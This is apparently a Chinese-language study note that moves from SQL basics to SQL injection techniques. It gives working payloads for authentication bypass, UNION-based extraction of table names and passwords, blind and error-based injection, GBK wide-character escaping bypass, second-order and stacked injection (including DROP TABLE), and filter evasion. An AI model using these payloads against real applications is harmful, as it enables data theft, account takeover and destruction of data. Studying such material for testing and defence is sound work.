# SQL注入漏洞
[TOC]

## SQL基础
### 对象
|对象|类型名|描述|
|---|---|---|
|数据库|DATABASE|多种数据表的集合|
|表|TABLE|同类数据的集合|
|列|COLUMN|一个属性|
|行|ROW|一条数据|
|主键|PRIMARY KEY|唯一标识一条数据|
|外键|FOREIGN KEY|表之间的引用关系|

### 数据类型
#### 注释
- `-- `：单行注释（注意后面有空格）
- `/* ... */`：多行注释

#### 数值类型
- `INT`: 整数类型
- `BIGINT`: 大整数类型
- `DECIMAL`: 定点数类型
- `FLOAT`: 浮点数类型
  
#### 字符串类型
- `CHAR(n)`: 固定长度字符串类型，长度为n
- `VARCHAR(n)`: 可变长度字符串类型，最大长度为n
- `TEXT`: 文本类型，存储大文本数据

#### 日期和时间类型
- `DATE`: 日期类型，格式为YYYY-MM-DD
- `TIME`: 时间类型，格式为HH:MM:SS
- `DATETIME`: 日期和时间类型，格式为YYYY-MM-DD HH:MM:SS
- `TIMESTAMP`: 时间戳类型，表示从1970年1月1日00:00:00 UTC到当前时间的秒数

### 语句
#### 数据定义语言(DDL)
- `CREATE`：创建数据库、表、索引等
  - 创建数据库: 
    ```sql
    CREATE DATABASE database_name;
    ```
  - 创建表: 
    ```sql
    CREATE TABLE table_name (
        column1 datatype, 
        column2 datatype, 
        ...
    );
    ```
  - 创建索引: 
    ```sql
    CREATE INDEX index_name ON table_name (column1, column2, ...);
    ```
  
- `ALTER`: 修改表结构
  - 添加列: 
    ```sql
    ALTER TABLE table_name ADD column_name datatype;
    ```
  - 删除列: 
    ```sql
    ALTER TABLE table_name DROP COLUMN column_name;
    ```
  - 修改列: 
    ```sql
    ALTER TABLE table_name ALTER COLUMN column_name datatype;
    ```

- `DROP`: 删除数据库、表、索引等

- `TRUNCATE`: 清空表数据，但保留表结构

#### 数据操作语言(DML)
- `INSERT`: 插入数据
  - 插入一条数据:
    ```sql
    INSERT INTO table_name (column1, column2, ...)
        VALUES (value1, value2, ...);
    ```
  - 插入多条数据:
    ```sql
    INSERT INTO table_name (column1, column2, ...)
        VALUES (value1, value2, ...),
               (value1, value2, ...),
               ...;
    ```
  - 从另一个表中插入数据: 
    ```sql
    INSERT INTO table_name (column1, column2, ...)
        SELECT column1, column2, ...
            FROM another_table
            WHERE condition;
    ```

- `UPDATE`: 更新数据
  - 更新指定列的数据: 
    ```sql
    UPDATE table_name
        SET column1 = value1, column2 = value2, ...
        WHERE condition;
    ```

#### 数据查询语言(DQL)
- `SELECT`：查询数据
  - 查询所有列: 
    ```sql
    SELECT * FROM table_name;
    ```
  - 查询指定列: 
    ```sql
    SELECT column1, column2 FROM table_name;
    ```
  - 查询带条件的数据: 
    ```sql
    SELECT column1, column2 
        FROM table_name 
        WHERE condition;
    ```
  - 取部分数据: 
    ```sql
    SELECT column1, column2
        FROM table_name 
        LIMIT offset, count;
    ```
  - 查询排序: 
    ```sql
    SELECT column1, column2 
        FROM table_name 
        ORDER BY column1 ASC|DESC;
    ```
  - 查询分组: 
    ```sql
    SELECT COUNT(*), column1
        FROM table_name 
        GROUP BY column1
        HAVING COUNT(*) > 1;
    ```
  - 查询合并: 两个结果列数必须一致且类型兼容
    ```sql
    SELECT column1, column2 
        FROM table1
    UNION 
    SELECT column1, column2 
        FROM table2;
    ```

- `WHERE` 条件

  | 运算符 | 含义 |
  |---|---|
  | `=`、`<>`、`!=` | 等于、不等于 |
  | `<`、`<=`、`>`、`>=` | 大小比较 |
  | `AND`、`OR`、`NOT` | 逻辑组合 |
  | `BETWEEN` | 闭区间 |
  | `IN` | 属于集合 |
  | `LIKE` | 模式匹配 |
  | `IS NULL` | 判断空值 |

- `GROUP BY` 分组

  | 聚合函数 | 含义 |
  |---|---|
  | `COUNT(*)` | 行数 |
  | `COUNT(column)` | 非空值行数 |
  | `SUM(column)` | 求和 |
  | `AVG(column)` | 平均值 |
  | `MAX(column)` | 最大值 |
  | `MIN(column)` | 最小值 |

### 内置函数
- `IF(condition, true_value, false_value)`：条件判断函数
#### 字符串函数
- `LENGTH(str)`：返回字符串长度
- `CONCAT(str1, str2, ...)`：连接字符串
- `SUBSTRING(str, start, length)`：截取字符串
- `GROUP_CONCAT(column)`：将分组中的值连接成一个字符串

#### 数学函数
- `ABS(num)`：返回绝对值
- `ROUND(num, decimals)`：四舍五入
  
#### 查询函数
- `NOW()`：返回当前日期和时间
- `database()`：返回当前数据库名
- `user()`：返回当前用户
 

### 内置表 (MySQL)
- `information_schema`：存储数据库元数据的系统数据库
  - `.tables`：存储数据库中所有表的信息
  - `.columns`：存储数据库中所有列的信息

## SQL注入
### 概念
应用把不可信输入作为 SQL 源代码的一部分交给数据库解析。

主要方法为：
```sql
[结束原上下文] [加入攻击表达式] [消除剩余原语句]
'             OR 1=1        -- 
```

### 判断上下文
- **字符串上下文**：输入被包裹在单引号或双引号中，`'` 或 `"` 后注入
- **数字上下文**：输入被当作数字处理，直接接注入
- **`LIKE`上下文**：输入被当作模式匹配处理，`%'` 或 `%"` 后注入

### 分类
#### 布尔恒真（认证绕过）
通过构造恒真条件绕过认证
```sql
' OR '1'='1' --
```

#### 联合查询（数据获取）
通过 `UNION` 关键字将攻击者的查询结果与原查询结果合并，从而获取数据
>[!TIP] 注意
一般要使原查询无效化，比如 `id=-1` 或 `AND 1=2`，原查询返回空，给目标信息留出回显空间。

1. **确定列数**: 报错表示超出列数上界
    ```sql
    ORDER BY 1 --
    ORDER BY 2 --
    ...
    ```

2. **确定列类型**: 逐个试出兼容类型
    ```sql
    UNION SELECT 1,NULL,NULL -- # NULL 兼容大多数类型
    UNION SELECT 'a',NULL,NULL --
    ...
    ```

3. **确认回显列**: 观察回显结果，确定哪一列可以回显数据
    ```sql
    UNION SELECT 1,2,3 -- 
    ```

4. **获取数据**: 通过回显列获取敏感数据
    ```sql
    -- 获取当前数据库名
    UNION SELECT 1,2,database()

    -- 获取表名
    UNION SELECT 1,2,group_concat(table_name) 
      FROM information_schema.tables 
      WHERE table_schema='database' 

    -- 获取列名
    UNION SELECT 1,2,group_concat(column_name) 
      FROM information_schema.columns 
      WHERE table_name='users' 

    -- 获取密码
     UNION SELECT 1,2,password FROM users
    ```

#### 布尔盲注（数据获取）
1. **真假对照**：通过构造布尔条件，确认真假条件下的页面差异
    ```sql
    AND 1=1 -- # 真
    AND 1=2 -- # 假
    ```
2. **布尔化查询**： 把关于某个值的问题转换成布尔条件
    > 一般用二分法
    ```sql
    # 判断用户密码是否以 a 开头
    AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' --
    # 二分版本
    AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 97 --
    ```

3. **盲注**: 进行假设，看能否返回正常页面，逐渐试出目标数据

    ```sql
    AND query_condition --
    AND query_condition --
    ...
    ```

#### 时间盲注（数据获取）
当页面没有明显的真假差异，通过延时来判断条件
```sql
# MySQL
AND IF(query_condition, SLEEP(5), 0) --
```
其余部分思路类似布尔盲注

#### 错误基注入（数据获取）
通过构造错误条件，获取数据库返回的错误信息中的敏感数据。

##### extractvalue
格式如下，xpath 格式错误会报错，并显示其内容
```sql
extractvalue(target, xpath)
```
一般用 `concat(0x7e, target_info)`，其中 `0x7e` 表示 `~`，用于凸显目标信息（有时候用 `"~"` 也行）
```sql
-- 获取数据库名
AND extractvalue(1, concat(0x7e, database())) --

-- 获取表名
AND extractvalue(1, 
  concat(0x7e, 
    (SELECT table_name FROM information_schema.tables)
  )
) --

-- 获取列名
AND extractvalue(1, 
  concat(0x7e, 
    (SELECT column_name FROM information_schema.columns WHERE table_name='users')
  )
) --
```

##### updatexml
格式如下，xpath 格式错误会报错，并显示其内容
```sql
updatexml(target, xpath, new_value)
```
具体写法和 `extractvalue` 类似

##### 主键重复
用 `floor` 和 `rand` 生成 0 1 序列
```sql
-- 生成 0~1 的随机数
rand()
-- 向下取整
floor()
-- 生成随机的 0 或 1
floor(rand()*2)
-- 固定种子，一定生成 0 1 1 0 1 1 ...
floor(rand(0)*2) AS f
```

group by 时，SQL 会建一张临时表，取出一条数据后，用键去临时表查询
- **键不存在**: 作为新一行插入表中
- **键存在**: 更新表中数据

按上述 `f` 分组，`f` 会在取出时计算一次，插入临时表时再计算一次，两次结果可能不同。
|顺序|操作|`f`|临时表键|判断结论|
|---|---|---|---|---|
|1|取出第一条数据|0|无|需插入|
|2|插入到临时表|1|无 -> 1|-|
|3|取出第二条数据|1|1|无需插入|
|4|取出第三条数据|0|1|需插入|
|5|插入到临时表|1|1 -> 1,1|**键冲突！**|

可知表中数据不少于 3 条时，一定会报错，报错信息中包含主键（`f`）的值。将 `f` 与目标信息拼接，即可获取。
```sql
SELECT 
  -- count 聚合触发临时表（不聚合可能不产生临时表）
  COUNT(*),
  -- 拼接 f 与目标信息，'~' 强调
  concat(0x7e, floor(rand(0)*2), database()) AS f
  -- 需要行数不小于 3 的表，可直接用 information_schema.tables 
  FROM sometable
  GROUP BY f
```



#### 宽字符注入（辅助技巧）
一些程序会在将指令交给 SQL 执行前，转义特殊字符，导致注入困难。
```php
# addslashes 函数在 ' " \ 等字符前加反斜杠转义
addslashes($id)
sql = "SELECT * FROM users WHERE id = '$id'";
```

GBK 编码中，宽字符（2字节）的编码可能正好是两个合法的单字节字符。
```c
"運" = 0x5c 0x27
  \ = 0x5c
  ' = 0x27
```

基于此，在特殊字符前加入特定编码，让即将插入的 `\` 被当作宽字符的一部分。
```c
输入:        %df  '
            0xdf 0x27

addslashes: %df  \    '
            0xdf 0x5c 0x27

SQL 解码后:  運        '
            0xdf 0x5c 0x27

单引号 ' 成功被保留，截断上文
```

#### 二次注入（篡改操作）
找到一个写入点，写入注入语句。即使被转义或参数化也没关系，此时语句只是被存入数据库暂时隐忍，卧薪尝胆。
```sql
UPDATE users SET username='$id'

$id = admin' --
```

当数据被在读取点被取出时，注入语句执行。时机已到，今日起兵！
```sql
UPDATE users SET password='$pass' WHERE username='$id'

$id = admin' --
$pass = I got you~
```
此时用户 `admin` 的密码就被你修改了。本质上二次注入可以展开的攻击取决于“读取点”给出的操作。

#### 堆叠注入（篡改操作）
如果允许多条 SQL 语句同时执行，可以在原语句后追加任意语句，达到篡改操作的目的。
```sql
SELECT * FROM users WHERE username='$id' 

$id = admin'; DROP TABLE users; -- 
```
这种最危险，因为可以注入任何命令，不过大部分数据库禁止多条语句执行。

### 过滤绕过
#### 空格绕过
空格如果被顾虑，可以用其他代替字符来分割 SQL 关键字
```sql
SELECT/**/1,2,3 -- 注释

%0a -- 换行符
%0b -- 垂直制表符
%0c -- 换页符
%0d -- 回车符
%09 -- 制表符

SELECT(id)FROM(users) -- 括号分割
SELECT`id`FROM`users` -- 反引号分割
```

#### 关键字绕过
普通关键字
```sql
SeLeCt -- 大小写混合

SESELECTLECT -- 双写（SE-SELECT-LECT）

SE/**/LECT -- 注释分割

-- 等价替换
information_schema.tables -> sys.schema_auto_increment_columns
```

关键符号
```sql
-- 逻辑符（等效替换）
AND -> &&
OR -> ||
NOT -> !

-- 等号（等效替换）
id=1 ->
        id LIKE 1
        id IN(1)
        id BETWEEN 1 AND 1
        !(id <> 1)

-- 引号（16进制）
'users' -> 0x7573657273 
```

## SQLmap
详见 [SQLmap](../tools/sqlmap.md)

